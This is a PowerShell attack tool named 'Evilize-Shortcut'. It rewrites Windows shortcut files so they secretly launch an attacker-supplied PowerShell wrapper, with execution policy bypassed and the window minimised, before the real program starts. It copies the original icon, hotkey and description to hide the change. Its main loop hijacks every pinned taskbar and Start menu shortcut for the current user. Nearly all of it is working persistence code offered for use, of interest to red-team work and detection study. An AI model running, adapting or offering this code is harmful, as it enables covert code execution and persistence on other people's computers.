
function Evilize-Shortcut
{
<#
.SYNOPSIS
Changes link files (shortcuts) to silently run a Powershell script before the original program executes.
Author: Aelon Porat (@whereIsBiggles)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION
Changes link files (shortcuts) to silently run a Powershell script before the original program executes.

.PARAMETER evilPowershellWrapper
Specifies the path to the Powershell wrapper scripts that executes instead of the original program.

.PARAMETER existingShortcutFileName
Specifies the path to a shortcut file

.EXAMPLE
Evilize-Shortcut -evilPowershellWrapper $env:temp\Evilize-Shortcut_Wrapper.ps1 -existingShortcutFileName "C:\Users\joe.smith\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\paint.lnk"

.LINK
http://www.twitter.com/whereIsBiggles
#>

    [CmdletBinding()] Param (
        [Parameter(Mandatory = $True)]
        [String]
        $existingShortcutFileName,

        [Parameter(Mandatory = $True)]
        [String]
        $evilPowershellWrapper
    )

    # Read target (existing) shortcut
    $shObj = New-Object -ComObject WScript.Shell
    $existingShortcut = $shObj.CreateShortcut($existingShortcutFileName)
    Add-Member -InputObject $existingShortcut -MemberType NoteProperty -Name "File_Name" -Value (ls $existingShortcut.FullName).name

    # Create new shortcut, replacing the existing one
    $evilShortcut = $shObj.CreateShortcut($existingShortcutFileName)
    $evilShortcut.TargetPath="powershell"
    $evilShortcut.Arguments="-NoProfile -ExecutionPolicy Bypass -File `"$evilPowershellWrapper`" -programToExecute `"$($existingShortcut.TargetPath)`" -programToExecuteParams `"$($existingShortcut.Arguments)`""
    $evilShortcut.WorkingDirectory = ""
    $evilShortcut.WindowStyle = 7
    $evilShortcut.Hotkey = $existingShortcut.Hotkey
    $evilShortcut.IconLocation = $($existingShortcut.IconLocation)
    $evilShortcut.Description = $($existingShortcut.Description)
    $evilShortcut.Save()
}






# Look for User Pinned shortcut files.  These usually include Start Meny and Task Bar.
$shortcutFiles = Get-ChildItem -Recurse -Path "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\" -Filter "*.lnk"

$evilPowershellWrapper = "C:\Users\administrator\Desktop\shortcut_wrapper.ps1"

foreach ($shortcutFile in $shortcutFiles)
{
    Evilize-Shortcut -existingShortcutFileName ($shortcutFile.fullName) -evilPowershellWrapper $evilPowershellWrapper
}
